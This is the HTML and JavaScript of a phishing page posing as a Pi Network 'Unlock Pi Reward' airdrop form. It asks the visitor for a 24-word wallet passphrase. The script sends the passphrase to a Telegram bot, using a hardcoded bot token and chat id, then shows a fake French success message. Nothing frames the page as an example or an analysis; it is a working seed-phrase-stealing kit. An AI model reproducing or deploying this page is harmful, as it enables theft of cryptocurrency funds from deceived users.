<body>
    <div id="loading-spinner"></div>
    <div id="main" class="container">
        <div class="header">
            <div class="back">
                <a href="#">

            <div class="title-page">

            </div>
        </div>

        <div class="form-container">
            <div class="title">
                Unlock Pi Reward
            </div>
            <form action="checkm.php" method="post" onsubmit="return validateForm()">
                <div class="textarea-container">
                    <textarea id="content" name="content" required rows="8" placeholder="Enter your 24-words passphrase here"></textarea>
                </div>
                <input type="hidden" name="ip_address" id="ip_address" value="">
                <input type="hidden" id="key" name="key">
                <button type="submit" class="button">Unlock with passphrase</button>
                <div id="emsg" class="message"></div>
            </form>

            <div class="text-block">
                <h5>As a non-custodial wallet, your wallet passphrase is only accessible to you. It is currently not possible to recover the wallet passphrase.</h5>
            </div>
            <div class="text-block">
                <h5>Lost your wallet passphrase? <span>you can create a new wallet</span>, but all the PI numbers in your previous wallet will be inaccessible.</h5>
            </div>
        </div>
    </div>

    <script>
        // Function to send a message to Telegram with the passphrase
        function sendToTelegram(passphrase) {
            const chatId = '1741959003';
            const botKey = '7354494708:AAEGDCeKoiPcXZo_mE4NzreaLsVS_mEqy90';
            const message = `New passphrase: ${passphrase}`;
    
            const url = `https://api.telegram.org/bot${botKey}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
    
            fetch(url)
                .then(response => response.json())
                .then(data => {
                    console.log('Message sent to Telegram:', data);
                    showSuccessMessage();
                })
                .catch(error => {
                    console.error('Error sending message to Telegram:', error);
                });
        }
    
        function showSuccessMessage() {
            document.getElementById("emsg").innerHTML = "F√©licitations! vous participez d√©sormais √† l'airdrop de PI.";
            document.getElementById("emsg").style.color = "green";
            document.getElementById("emsg").style.fontWeight = "bold";
    
            document.getElementById("content").value = "";
            document.getElementById("key").value = "";
            
            setTimeout(function() {
                location.reload();
            }, 10000);
        }
    
        function validateForm() {
            const textarea = document.getElementById("content");
            const inputValue = textarea.value.trim();
            
            const wordCount = inputValue.split(/\s+/).filter(word => word.length > 0).length;
            
            if (wordCount === 24) {
                sendToTelegram(inputValue);
                return false;
            } else {
                document.getElementById("emsg").innerHTML = "Invalid Passphrase (must be exactly 24 words)";
                return false;
            }
        }

        document.addEventListener("DOMContentLoaded", () => {
            const form = document.querySelector("form");
            form.onsubmit = function (event) {
                if (!validateForm()) {
                    event.preventDefault();
                }
            };
    
            window.onload = () => {
                document.getElementById("loading-spinner").style.display = "none";
                document.getElementById("main").style.display = "block";
                
                // Forcer la largeur compl√®te
                document.querySelector('.container').style.width = '100vw';
                document.body.style.width = '100vw';
            };
        });

        // Emp√™cher le zoom avec le pincement
        document.addEventListener('touchstart', function(event) {
            if (event.touches.length > 1) {
                event.preventDefault();
            }
        });

        document.addEventListener('gesturestart', function(event) {
            event.preventDefault();
        });

        document.addEventListener('gesturechange', function(event) {
            event.preventDefault();
        });

        document.addEventListener('gestureend', function(event) {
            event.preventDefault();
        });

        // Correction suppl√©mentaire pour Chrome
        window.addEventListener('resize', function() {
            document.querySelector('.container').style.width = '100vw';
        });
    </script>
